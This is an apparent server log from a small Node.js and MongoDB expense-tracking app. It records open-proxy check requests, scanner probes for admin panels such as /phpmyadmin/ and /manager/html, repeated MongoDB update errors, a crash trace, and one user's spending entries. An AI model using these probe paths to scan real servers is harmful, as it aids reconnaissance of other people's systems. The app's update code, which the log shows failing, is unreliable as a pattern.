+[0mGET http://www.haosou.com/?rands=_1435113760012437882553000 [32m200 [0m1.397 ms - 2732[0m
+[0mGET http://reg.renren.com/?rands=_20424132280014794503108240 [32m200 [0m1.358 ms - 2732[0m
+[0mGET http://m.baidu.com/?rands=_1531010252481124712350300 [32m200 [0m1.326 ms - 2732[0m
+[0mGET http://www.kuaidaili.com/?rands=_10281950483775861049452 [32m200 [0m1.480 ms - 2732[0m
+Not Found
+[0mGET http://www.luisaranguren.com/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.1273852155338988 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.luisaranguren.com/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.rx2.eu/ivy/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.5850508470966306 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.9128957228206569 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.rx2.eu/ivy/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxy-listen.de/azenv.php [0m- [0m- ms - -[0m
+Not Found
+Not Found
+[0mGET http://www.proxy-listen.de/azenv.php [0m- [0m- ms - -[0m
+[0mGET http://www.luisaranguren.com/azenv.php [0m- [0m- ms - -[0m
+Not Found
+task begin
+bakcup  data length is: undefined
+user colour.hu  has no data
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.4275473048688845 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxy-listen.de/azenv.php [0m- [0m- ms - -[0m
+[0mGET http://proxyjudge.us/ [32m200 [0m11.020 ms - 2732[0m
+[0mGET / [32m200 [0m10.395 ms - 2732[0m
+Not Found
+[0mGET http://www.rx2.eu/ivy/azenv.php [0m- [0m- ms - -[0m
+[0mGET /moneyDetail?limit=10&offset=0 [32m200 [0m45.878 ms - 3393[0m
+[0mGET /accountDetail? [32m200 [0m36.161 ms - 277[0m
+[0mGET /monthHistory? [32m200 [0m37.093 ms - 137[0m
+[0mGET /moneyDetail?limit=10&offset=10 [32m200 [0m5.232 ms - 5614[0m
+[0mGET /moneyDetail?limit=10&offset=0 [32m200 [0m4.830 ms - 3393[0m
+Not Found
+[0mGET /accountDetail? [32m200 [0m24.546 ms - 277[0m
+[0mGET /moneyDetail?limit=10&offset=0 [32m200 [0m5.342 ms - 3393[0m
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.6731738469785023 [0m- [0m- ms - -[0m
+userName lilieming
+[{"userName":"lilieming","label":"早餐","modifyTime":1464050128564,"count":14,"_id":"571793131efc4003029eddbf"}] result is 
+null
+null
+[0mPUT /moneyDetail [32m200 [0m12.724 ms - 36[0m
+{ [MongoError: Mod on _id not allowed]
+  name: 'MongoError',
+  message: 'Mod on _id not allowed',
+  ok: 1,
+  n: 0,
+  code: 10148,
+  errmsg: 'Mod on _id not allowed',
+  writeConcernError: { code: 10148, errmsg: 'Mod on _id not allowed' } }
+[0mGET /moneyDetail?limit=10&offset=0 [32m200 [0m8.276 ms - 3566[0m
+userName lilieming
+[0mPUT /moneyDetail [32m200 [0m24.027 ms - 36[0m
+[] result is 
+null
+null
+{ [MongoError: Mod on _id not allowed]
+  name: 'MongoError',
+  message: 'Mod on _id not allowed',
+  ok: 1,
+  n: 0,
+  code: 10148,
+  errmsg: 'Mod on _id not allowed',
+  writeConcernError: { code: 10148, errmsg: 'Mod on _id not allowed' } }
+userName lilieming
+[{"userName":"lilieming","label":"公交卡","modifyTime":1462972783620,"count":2,"_id":"571b15371efc4003029eddd2"}] result is 
+[0mPUT /moneyDetail [32m200 [0m22.899 ms - 36[0m
+null
+null
+{ [MongoError: Mod on _id not allowed]
+  name: 'MongoError',
+  message: 'Mod on _id not allowed',
+  ok: 1,
+  n: 0,
+  code: 10148,
+  errmsg: 'Mod on _id not allowed',
+  writeConcernError: { code: 10148, errmsg: 'Mod on _id not allowed' } }
+userName lilieming
+[{"userName":"lilieming","label":"话费","modifyTime":1462282616512,"count":1,"_id":"5728a9781efc4003029eddf7"}] result is 
+[0mPUT /moneyDetail [32m200 [0m5.741 ms - 36[0m
+null
+null
+{ [MongoError: Mod on _id not allowed]
+  name: 'MongoError',
+  message: 'Mod on _id not allowed',
+  ok: 1,
+  n: 0,
+  code: 10148,
+  errmsg: 'Mod on _id not allowed',
+  writeConcernError: { code: 10148, errmsg: 'Mod on _id not allowed' } }
+[0mGET /moneyDetail?limit=10&offset=0 [32m200 [0m13.684 ms - 3873[0m
+Not Found
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+[0mGET http://www.sogou.com/?rands=_1592861142423375521286280 [32m200 [0m23.842 ms - 2732[0m
+[0mGET http://www.haosou.com/?rands=_21091754008527742257956 [32m200 [0m2.389 ms - 2732[0m
+[0mGET http://reg.renren.com/?rands=_1230120080013770512898000 [32m200 [0m2.558 ms - 2732[0m
+[0mGET http://m.baidu.com/?rands=_1790349636154665150640 [32m200 [0m1.511 ms - 2732[0m
+[0mGET http://www.kuaidaili.com/?rands=_1194648404420128921171944 [32m200 [0m1.319 ms - 2732[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.9428107893011612 [0m- [0m- ms - -[0m
+[0mGET http://www.example.com/ [32m200 [0m10.258 ms - 2732[0m
+Not Found
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.4416819620938302 [0m- [0m- ms - -[0m
+[0mGET /moneyDetail?limit=10&offset=0 [32m200 [0m23.390 ms - 3873[0m
+[0mGET /monthHistory? [32m200 [0m24.339 ms - 137[0m
+[0mGET /accountDetail? [32m200 [0m38.022 ms - 277[0m
+[0mGET /moneyDetail?limit=10&offset=10 [32m200 [0m12.169 ms - 5317[0m
+[0mGET /moneyDetail?limit=10&offset=0 [32m200 [0m6.347 ms - 3873[0m
+userName lilieming
+[] result is 
+[0mPUT /moneyDetail [32m200 [0m15.638 ms - 36[0m
+null
+null
+{ [MongoError: Mod on _id not allowed]
+  name: 'MongoError',
+  message: 'Mod on _id not allowed',
+  ok: 1,
+  n: 0,
+  code: 10148,
+  errmsg: 'Mod on _id not allowed',
+  writeConcernError: { code: 10148, errmsg: 'Mod on _id not allowed' } }
+[0mGET /moneyDetail?limit=10&offset=0 [32m200 [0m13.005 ms - 3874[0m
+Not Found
+[0mGET http://www.luisaranguren.com/azenv.php [0m- [0m- ms - -[0m
+[0mGET http://proxyjudge.us/ [32m200 [0m15.420 ms - 2732[0m
+[0mGET / [32m200 [0m9.142 ms - 2732[0m
+[0mGET / [32m200 [0m12.421 ms - 2732[0m
+[0mGET / [32m200 [0m1.350 ms - 2732[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.0138011269891384 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+[0mGET http://www.sogou.com/?rands=_26649116683616998301557848 [32m200 [0m10.065 ms - 2732[0m
+[0mGET http://www.haosou.com/?rands=_246082484024307414249240 [32m200 [0m1.309 ms - 2732[0m
+[0mGET http://reg.renren.com/?rands=_233552677912438313424898304 [32m200 [0m1.383 ms - 2732[0m
+[0mGET http://m.baidu.com/?rands=_24912325864245062514681040 [32m200 [0m1.342 ms - 2732[0m
+[0mGET http://www.kuaidaili.com/?rands=_15301218567616401069376 [32m200 [0m1.276 ms - 2732[0m
+Not Found
+[0mGET http://www.rx2.eu/ivy/azenv.php [0m- [0m- ms - -[0m
+[0mGET http://123.125.114.238/ [32m200 [0m11.557 ms - 2732[0m
+[0mGET http://www.izhongsai.com/ [32m200 [0m6.130 ms - 2732[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.6642089583493243 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.rx2.eu/ivy/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.5210609198684398 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxy-listen.de/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.luisaranguren.com/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.8803963822649306 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.rx2.eu/ivy/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxy-listen.de/azenv.php [0m- [0m- ms - -[0m
+[0mGET http://www.sogou.com/?rands=_791543095012635251777664 [32m200 [0m14.656 ms - 2732[0m
+[0mGET http://www.haosou.com/?rands=_816812690002269293632688 [32m200 [0m1.489 ms - 2732[0m
+[0mGET http://reg.renren.com/?rands=_1037424327014482082590680 [32m200 [0m1.334 ms - 2732[0m
+[0mGET http://m.baidu.com/?rands=_28600134387233231004374720 [32m200 [0m1.497 ms - 2732[0m
+[0mGET http://www.kuaidaili.com/?rands=_824104316016807894091964 [32m200 [0m1.451 ms - 2732[0m
+Not Found
+[0mGET http://testp1.piwo.pila.pl/testproxy.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.rx2.eu/ivy/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.7319524348642706 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.8888879052539946 [0m- [0m- ms - -[0m
+[0mGET http://proxyjudge.us/ [32m200 [0m19.488 ms - 2732[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+[0mGET http://www.google.com/reader/about/ [0m- [0m- ms - -[0m
+Not Found
+Not Found
+[0mGET http://www.proxy-listen.de/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.5440553079173097 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxy-listen.de/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxy-listen.de/azenv.php [0m- [0m- ms - -[0m
+Not Found
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+[0mGET http://www.luisaranguren.com/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.rx2.eu/ivy/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.8333137427653214 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.rx2.eu/ivy/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.5559278047017347 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.luisaranguren.com/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+[0mGET http://proxyjudge.us/ [32m200 [0m17.398 ms - 2732[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.4048396288477374 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxy-listen.de/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.rx2.eu/ivy/azenv.php [0m- [0m- ms - -[0m
+[0mGET http://www.sogou.com/?rands=_10003108079221899253813376 [32m200 [0m17.616 ms - 2732[0m
+[0mGET http://www.haosou.com/?rands=_1838430576029411911394232 [32m200 [0m1.602 ms - 2732[0m
+[0mGET http://reg.renren.com/?rands=_19285160786544104231384 [32m200 [0m2.116 ms - 2732[0m
+[0mGET http://m.baidu.com/?rands=_225125170402942103071484 [32m200 [0m1.339 ms - 2732[0m
+Not Found
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.1827916070784981 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxy-listen.de/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+[0mGET http://123.125.114.238/ [32m200 [0m12.031 ms - 2732[0m
+Not Found
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+[0mGET http://proxyjudge.us/ [32m200 [0m11.541 ms - 2732[0m
+[0mGET / [32m200 [0m10.386 ms - 2732[0m
+Not Found
+[0mGET /phpmyadmin/ [0m- [0m- ms - -[0m
+Not Found
+[0mGET /phpmyadmin/ [0m- [0m- ms - -[0m
+Not Found
+[0mGET /phpmyadmin/ [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+[0mGET http://www.sogou.com/?rands=_164291493121986481032840 [32m200 [0m13.990 ms - 2732[0m
+[0mGET http://www.haosou.com/?rands=_275419148811078401565872 [32m200 [0m1.282 ms - 2732[0m
+[0mGET http://reg.renren.com/?rands=_16530151328521433223920 [32m200 [0m1.394 ms - 2732[0m
+[0mGET http://m.baidu.com/?rands=_306538350179249444776 [32m200 [0m1.299 ms - 2732[0m
+Not Found
+[0mGET http://www.luisaranguren.com/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET /manager/html [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxy-listen.de/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+task begin
+user colour.hu  has no data
+bakcup  data length is: undefined
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+[0mGET http://www.baidu.com/ [32m200 [0m10.772 ms - 2732[0m
+[0mGET /accountDetail? [32m200 [0m34.384 ms - 277[0m
+[0mGET /monthHistory? [32m200 [0m28.572 ms - 137[0m
+[0mGET /moneyDetail?limit=10&offset=0 [32m200 [0m31.207 ms - 3874[0m
+[0mGET /moneyDetail?limit=10&offset=10 [32m200 [0m5.260 ms - 4972[0m
+userName lilieming
+[{"userName":"lilieming","label":"打车","modifyTime":1462894570129,"count":2,"_id":"5728a99a1efc4003029eddfa"}] result is 
+[0mPUT /moneyDetail [32m200 [0m10.295 ms - 36[0m
+null
+{ [MongoError: Mod on _id not allowed]
+  name: 'MongoError',
+  message: 'Mod on _id not allowed',
+  ok: 1,
+  n: 0,
+  code: 10148,
+  errmsg: 'Mod on _id not allowed',
+  writeConcernError: { code: 10148, errmsg: 'Mod on _id not allowed' } }
+null
+userName lilieming
+[{"userName":"lilieming","label":"早餐","modifyTime":1464183811884,"count":15,"_id":"571793131efc4003029eddbf"}] result is 
+[0mPUT /moneyDetail [32m200 [0m10.345 ms - 36[0m
+null
+null
+{ [MongoError: Mod on _id not allowed]
+  name: 'MongoError',
+  message: 'Mod on _id not allowed',
+  ok: 1,
+  n: 0,
+  code: 10148,
+  errmsg: 'Mod on _id not allowed',
+  writeConcernError: { code: 10148, errmsg: 'Mod on _id not allowed' } }
+userName lilieming
+[{"userName":"lilieming","label":"午餐","modifyTime":1463063682168,"count":3,"_id":"572211311efc4003029edde3"}] result is 
+[0mPUT /moneyDetail [32m200 [0m4.755 ms - 36[0m
+null
+null
+{ [MongoError: Mod on _id not allowed]
+  name: 'MongoError',
+  message: 'Mod on _id not allowed',
+  ok: 1,
+  n: 0,
+  code: 10148,
+  errmsg: 'Mod on _id not allowed',
+  writeConcernError: { code: 10148, errmsg: 'Mod on _id not allowed' } }
+userName lilieming
+[{"userName":"lilieming","label":"超市","modifyTime":1463802381843,"count":26,"_id":"5717935b1efc4003029eddc1"}] result is 
+[0mPUT /moneyDetail [32m200 [0m4.787 ms - 36[0m
+null
+null
+{ [MongoError: Mod on _id not allowed]
+  name: 'MongoError',
+  message: 'Mod on _id not allowed',
+  ok: 1,
+  n: 0,
+  code: 10148,
+  errmsg: 'Mod on _id not allowed',
+  writeConcernError: { code: 10148, errmsg: 'Mod on _id not allowed' } }
+[0mGET /moneyDetail?limit=10&offset=0 [32m200 [0m15.655 ms - 4560[0m
+[0mGET /moneyDetail?limit=10&offset=0 [32m200 [0m5.658 ms - 4560[0m
+[0mGET /moneyDetail?limit=10&offset=0 [32m200 [0m10.342 ms - 4560[0m
+userName lilieming
+[{"userName":"lilieming","label":"奶茶","modifyTime":1462972814771,"count":3,"_id":"5729fc7e1efc4003029ede00"}] result is 
+null
+null
+{ [MongoError: Mod on _id not allowed]
+  name: 'MongoError',
+  message: 'Mod on _id not allowed',
+  ok: 1,
+  n: 0,
+  code: 10148,
+  errmsg: 'Mod on _id not allowed',
+  writeConcernError: { code: 10148, errmsg: 'Mod on _id not allowed' } }
+[0mPUT /moneyDetail [32m200 [0m30.026 ms - 36[0m
+[0mGET /moneyDetail?limit=10&offset=0 [32m200 [0m8.308 ms - 4731[0m
+[0mGET /moneyDetail?limit=10&offset=0 [32m200 [0m20.772 ms - 4731[0m
+Not Found
+[0mGET http://www.luisaranguren.com/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxy-listen.de/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+[0mGET http://www.mafengwo.cn/ [32m200 [0m13.902 ms - 2732[0m
+Not Found
+[0mGET http://www.rx2.eu/ivy/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxy-listen.de/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET /computer/ [0m- [0m- ms - -[0m
+Not Found
+[0mGET /index.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/robots.txt [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+[0mGET http://www.google.com/reader/about/ [0m- [0m- ms - -[0m
+Not Found
+Not Found
+Not Found
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.rx2.eu/ivy/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.luisaranguren.com/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.rx2.eu/ivy/azenv.php [0m- [0m- ms - -[0m
+[0mGET http://www.mafengwo.cn/ [32m200 [0m9.702 ms - 2732[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+[0mGET http://123.125.114.238/ [32m200 [0m8.665 ms - 2732[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://domkrim.com/av.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET /cgi-bin/authLogin.cgi [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+[0mGET http://proxyjudge.us/ [32m200 [0m6.112 ms - 2732[0m
+Not Found
+[0mGET http://www.rx2.eu/ivy/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.6725438690665856 [0m- [0m- ms - -[0m
+[0mGET http://www.elong.com/ [32m200 [0m14.595 ms - 2732[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.9110951444295536 [0m- [0m- ms - -[0m
+Not Found
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.rx2.eu/ivy/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.3063224182551872 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.proxyjudge.info/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.rx2.eu/ivy/azenv.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.4950147135550789 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.advalleys.com/azenvaa.php [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.9799768551371114 [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+Not Found
+[0mGET http://www.baidu.com/cache/global/img/gs.gif [0m- [0m- ms - -[0m
+[0mGET / [32m200 [0m13.332 ms - 2732[0m
+[0mGET /css/jquery-ui/jquery-ui.min.css [32m200 [0m1.829 ms - 30118[0m
+[0mGET /css/main.css [32m200 [0m2.451 ms - 1516[0m
+[0mGET /js/jquery-debounce-throttle.js [32m200 [0m2.553 ms - 10253[0m
+[0mGET /js/jquery-blockUI/jquery.blockUI.js [32m200 [0m2.077 ms - 19966[0m
+[0mGET /js/jquery/jquery.min.js [32m200 [0m4.059 ms - 95957[0m
+[0mGET /css/bootstrap/bootstrap.min.css [32m200 [0m9.467 ms - 122540[0m
+[0mGET /js/jquery-ui/datepicker-cn.js [32m200 [0m2.399 ms - 1241[0m
+[0mGET /js/util/cookie.js [32m200 [0m1.934 ms - 1389[0m
+[0mGET /js/bootstrap/bootstrap.min.js [32m200 [0m2.144 ms - 36816[0m
+[0mGET /js/react/react.min.js [32m200 [0m3.221 ms - 121738[0m
+[0mGET /js/util/helper.js [32m200 [0m1.724 ms - 266[0m
+[0mGET /js/jquery-ui/jquery-ui.min.js [32m200 [0m1.893 ms - 240427[0m
+[0mGET /js/highcharts/highcharts.js [32m200 [0m2.452 ms - 168540[0m
+[0mGET /js/src/index.js [32m200 [0m2.240 ms - 29747[0m
+[0mGET /js/jquery/jquery.min.js?tcdsp [32m200 [0m1.179 ms - 95957[0m
+[0mGET /img/bg5.jpg [32m200 [0m2.684 ms - 398423[0m
+[0mGET /js/react/JSXTransformer.js [32m200 [0m2.593 ms - 493024[0m
+[0mGET /js/src/index.js [36m304 [0m3.718 ms - -[0m
+[0mHEAD / [36m304 [0m1.971 ms - -[0m
+[0mGET /js/src/index.js [36m304 [0m2.207 ms - -[0m
+[0mHEAD /js/src/index.js [36m304 [0m1.533 ms - -[0m
+[0mGET /moneyDetail [32m200 [0m17.745 ms - 24[0m
+[0mHEAD /moneyDetail [36m304 [0m6.080 ms - -[0m
+Not Found
+[0mGET /moneyDetail [36m304 [0m3.670 ms - -[0m
+[0mHEAD /moneyDetail [36m304 [0m3.342 ms - -[0m
+/app/money/node_modules/mongodb/lib/utils.js:97
+    process.nextTick(function() { throw err; });
+                                        ^
+TypeError: Cannot read property '_id' of undefined
+    at /app/money/routes/account.js:12:17
+    at /app/money/module/db.js:32:5
+    at handleCallback (/app/money/node_modules/mongodb/lib/utils.js:95:12)
+    at /app/money/node_modules/mongodb/lib/cursor.js:688:16
+    at handleCallback (/app/money/node_modules/mongodb/node_modules/mongodb-core/lib/cursor.js:249:5)
+    at setCursorNotified (/app/money/node_modules/mongodb/node_modules/mongodb-core/lib/cursor.js:458:3)
+    at /app/money/node_modules/mongodb/node_modules/mongodb-core/lib/cursor.js:561:16
+    at queryCallback (/app/money/node_modules/mongodb/node_modules/mongodb-core/lib/cursor.js:225:5)
+    at Callbacks.emit (/app/money/node_modules/mongodb/node_modules/mongodb-core/lib/topologies/server.js:95:3)
+    at null.messageHandler (/app/money/node_modules/mongodb/node_modules/mongodb-core/lib/topologies/server.js:246:23)
